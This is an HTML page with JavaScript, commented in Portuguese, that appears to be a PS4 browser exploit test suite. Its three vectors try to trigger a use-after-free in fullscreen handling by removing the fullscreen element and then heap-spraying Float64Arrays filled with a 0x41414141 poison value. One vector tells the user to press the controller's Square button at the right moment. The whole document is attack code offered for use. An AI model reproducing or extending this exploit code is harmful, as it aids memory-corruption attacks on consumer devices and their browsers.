
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v540000: The Synchronization</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #020; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #040; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v540000: THE SYNCHRONIZATION</h1>

<div class="status" id="msg">
    FOCO: REPLICAR O CRASH DO BOTÃO QUADRADO<br>
    CLIQUE -> SIGA A INSTRUÇÃO EXATA
</div>

<button onclick="sync(s01)">01. Calculated Delay Race (Auto)</button>

<button onclick="sync(s02)">02. "Press Square" Poison Trap</button>

<button onclick="sync(s03)">03. Change Event Nuke</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    
    // Spray Global
    let spray_store = [];
    // Padrão 0x41414141 (Float64 representation)
    const poison_val = 2.121995791e-314; 

    function sync(vectorFunc) {
        Stage.innerHTML = "";
        spray_store = [];
        vectorFunc(Stage);
    }

    // =================================================================
    // 01. Calculated Delay Race (Auto)
    // Tenta consertar o Teste 2 anterior adicionando um atraso
    // minúsculo entre o pedido de Fullscreen e a destruição.
    // =================================================================
    function s01(stage) {
        const div = document.createElement('div');
        div.innerText = "AUTO DELAY TARGET";
        div.style.background = "blue";
        stage.appendChild(div);

        div.onclick = () => {
            // 1. Pede Fullscreen
            if (div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            else if (div.requestFullscreen) div.requestFullscreen();
            
            // 2. O FIX: Não destrói imediatamente.
            // Espera o navegador "respirar" (Next Tick)
            requestAnimationFrame(() => {
                // Agora que o processo de fullscreen começou...
                // DESTRÓI TUDO!
                div.remove();
                
                // Spray imediato
                for(let i=0; i<5000; i++) {
                    const f = new Float64Array(32);
                    f.fill(poison_val);
                    spray_store.push(f);
                }
            });
        };
        // Clica automático
        setTimeout(() => div.click(), 500);
    }

    // =================================================================
    // 02. "Press Square" Poison Trap (Manual)
    // Este é projetado especificamente para o que você descobriu.
    // Nós envenenamos a memória PRIMEIRO, e você aperta Quadrado DEPOIS.
    // =================================================================
    function s02(stage) {
        const div = document.createElement('div');
        div.innerText = "MANUAL TRAP";
        div.style.background = "red";
        // Torna o elemento focável para aceitar o input do controle
        div.tabIndex = 0; 
        stage.appendChild(div);

        // Prepara o veneno
        let victim = { ref: div, data: new Array(100).fill(1) };

        div.onclick = () => {
            Msg.innerText = "⚠️ APERTE O BOTÃO QUADRADO AGORA!!! ⚠️";
            Msg.style.background = "red";
            div.focus(); // Garante que o foco está no elemento alvo
            
            // 1. O VENENO (Executa ANTES do seu clique no quadrado)
            // Removemos o elemento do DOM logicamente
            div.remove(); 
            // Mas mantemos ele visível na tela por um truque (se possível)
            // ou apenas deixamos o navegador lidar com o foco fantasma
            
            // Libera a referência
            victim = null;
            
            // SPRAY MASSIVO (Enche a memória onde o elemento estava)
            // Quando você apertar Quadrado, o navegador vai buscar as info
            // de Fullscreen nesse endereço de memória.
            setInterval(() => {
                for(let i=0; i<100; i++) {
                    const f = new Float64Array(16);
                    f.fill(poison_val);
                    spray_store.push(f);
                }
            }, 10);
        };
        
        // Clica para iniciar a preparação
        setTimeout(() => div.click(), 500);
    }

    // =================================================================
    // 03. Change Event Nuke
    // Usa o evento que confirma a entrada em Fullscreen para destruir
    // o objeto "de dentro para fora".
    // =================================================================
    function s03(stage) {
        const div = document.createElement('div');
        div.innerText = "CHANGE EVENT NUKE";
        div.style.background = "green";
        stage.appendChild(div);

        // Listener: Assim que o Fullscreen for confirmado...
        document.onwebkitfullscreenchange = () => {
            // CRASH: Destrói o elemento que acabou de entrar em fullscreen
            div.remove();
            document.body.innerHTML = "";
            
            // Tenta forçar um repaint
            const x = document.body.offsetHeight;
            
            // Spray
            for(let i=0; i<5000; i++) {
                const f = new Float64Array(32);
                f.fill(poison_val);
                spray_store.push(f);
            }
        };

        div.onclick = () => {
            if (div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            else if (div.requestFullscreen) div.requestFullscreen();
        };
        setTimeout(() => div.click(), 500);
    }

</script>
</body>
</html>
